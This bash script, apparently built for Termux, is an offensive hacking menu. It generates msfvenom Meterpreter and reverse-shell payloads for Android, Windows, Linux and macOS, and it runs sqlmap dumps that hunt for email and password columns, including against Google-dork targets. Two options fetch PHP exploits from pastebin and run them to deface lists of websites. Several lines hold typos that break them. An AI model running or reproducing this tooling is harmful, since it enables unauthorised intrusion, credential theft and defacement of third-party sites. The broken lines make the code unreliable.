#!usr/bin/bash
#Created by D3m0ni4k

clear
blue='[34;1m'
green='[32;1m'
purple='[35;1m'
cyan='[36;1m'
red='[31;1m'
white='[37;1m'
yellow='[33;1m'
echo "[====================================]" | lolcat
echo $blue"CodeBy : D3m0ni4k"
echo $blue"Github : https://github.com/D3m0ni4k"
echo "[====================================]" | lolcat
sleep 1
echo $green"(1) Install Metasploit"
echo $green"(2) Install ngrok"
echo $white"[$]========Payload Generator========[$]" | lolcat
echo $red"(A) Android"
echo $red"(W) Windows"
echo $red"(L) Linux"
echo $red"(M) MacOs"
echo $white"[$]=========Hacking Website=========[$]" | lolcat
echo $blue"(SQ) Auto Dump sqlmap"
echo $blue"(SQ1)Auto Dump sqlmap (dork)"
echo $blue"(D)  Auto Deface Web 1"
echo $blue"(D1) Auto Deface Web 2"
echo $blue"(N)  Scan Vuln Sql Nmap"
echo $blue"(N1) Scan Subdomain website nmap"
echo $red"(X)  Exit"
echo "[$]============Terminal============[$]" | lolcat
echo $red"╭─ root@D3m0ni4k"
read -p "╰$ " j

if [ $j = 1 ]
then
pkg install figlet -y
figlet Installing
pkg install curl -y
pkg install git -y
pkg install ruby -y
curl -LO https://raw.githubusercontent.com/Hax4us/Metasploit_termux/master/metasploit.sh
chmod +x metasploit.sh
./metasploit.sh
echo $red "Metasploit install"
fi

if [ $j = 2 ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
read -p "token ngrok : " l
./ngrok authtoken $l
./ngrok
fi

if [ $j = A ]
then
echo $red"Metasploit install"
sleep 1
read -p "LocalHost : " c
read -p "LocalPort : " b
read -p "payload : " a
msfvenom -p android/meterpreter/reverse_tcp LHOST=$c LPORT=$b -o /storage/emulated/0/$a
echo $green"Payload payload internal memory"
fi

if [ $j = W ]
then
echo $red"Metasploit install"
sleep 1
read -p "LocalHost : " a
read -p "LocalPort : " b
read -p "payload : " c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload payload internal memory"
fi

if [ $j = L ]
then
echo $red"Metasploit install"
sleep 1
read -p "LocalHost : " a
read -p "LocalPort : " b
read -p "payload : " c
echo "[========Os========]" | lolcat
echo $blue"(1) aarch64"
echo $blue"(2) x64"
echo $blue"(3) x86"
echo "[========Os========]" | lolcat
read -p "Os : " h

if [ $h = 1 ]
then
msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload memory internal"
fi

if [ $h = 2 ]
then
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$a
echo $green"Payload memory internal"
fi

if [ $h = 3 ]
then
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload memory internal"
fi

fi

if [ $j = M ]
then
echo $red"Metasploit install"
read -p "LocalHost : " a
read -p "LocalPort : " b
read -p "payload : " c
echo "[========Os========]" | lolcat
echo $blue"(1) armle"
echo $blue"(2) ppc"
echo $blue"(3) x86"
echo $blue"(4) x64"
echo "[========Os========]" | lolcat
read -p "Os : " k

if [ $k = 1 ]
then
msfvenom -p osx/armle/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload internal memory"
fi

if [ $k = 2 ]
then
msfvenom -p osx/ppc/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/o/$c
echo $green"Payload internal memory"
fi

if [ $k = 3 ]
then
msfvenom -p osx/x86/shell_reverse_tco LHOST=$a LPORT=$b -o /storage/emulated/0/$c
echo $green"Payload internal memory"
fi

if [ $k = 4 ]
then
msfvenom -p osx/x64/shell_reverse_tcp LHOST=$a LPORT=$b -o /storage/emulated/o/$c
echo $green"Payload internal memory"
fi
fi

if [ $j = SQ ]
then
pkg install figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
pip2 install termcolor
cd sqlmap
read -p "Hostname/linkweb : " r
python2 sqlmap.py -u $r --batch --dbs --tamper=space2comment --level=2 --risk=2 --flush-session --time-sec 10 --search -C mail,password --smart -o "Done"
echo "Dump Are Done"
ls
fi

if [ $j = SQ1 ]
then
pkg instalk figlet -y
figlet Installing
pkg install git -y
pkg install python2 -y
git clone https://github.com/sqlmapproject/sqlmap
cd sqlmap
read -p "Dork : " d
python2 sqlmap.py -g $d --batch --dbs --tamper=space2comment --level=2 --risk=2 --smart --flush-session --time-sec 15 --search -C mail,password -o Done
echo $red"Dump Are Done"
fi

if [ $j = D ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
pkg install php -y
read -p "list Website (bacot.txt) : " g
read -p "script deface (harus berektensi .htm bukan .html)" h
wget https://pastebin.com/raw/LDvFvtUD -O com_fabrik.php
phhp com_fabrik.php $g $h
fi

if [ $j = D1 ]
then
pkg install figlet -y
figlet Installing
pkg install wget -y
pkg install php -y
read -p "list website (bacot.txt) : " k
read -p "script deface (harus berektensi .htm bukan .html)" t
wget https://pastebin.com/raw/EAtSir5V -O com_foxcontact.php
php com_foxcontact.php $k $t
fi

if [ $j = N ]
then
pkg install figlet -y
figlet Installing
pkg install nmap -y
read -p "Hostname website : " l
nmap -sV --script=http-sql-injection.nse $l -p 80
echo $green"Scan website select"
fi

if [ $j = N1 ]
then
pkg install figlet -y
figlet Installing
pkg install nmap -y
read -p "Hostname website : " g
nmap -sV --script=dns-brute.nse $g -p 80
echo $green"Scan Website select"
fi

if [ $j = X ]
then
echo $green"Thanks to use this tools :)"
sleep 1
echo $green"Team #R3v0lt"
sleep 1
echo $green"See You Soon"
sleep 1
echo $green"Anonymous"
sleep 1
echo $green"Bye"
sleep 1
exit
fi

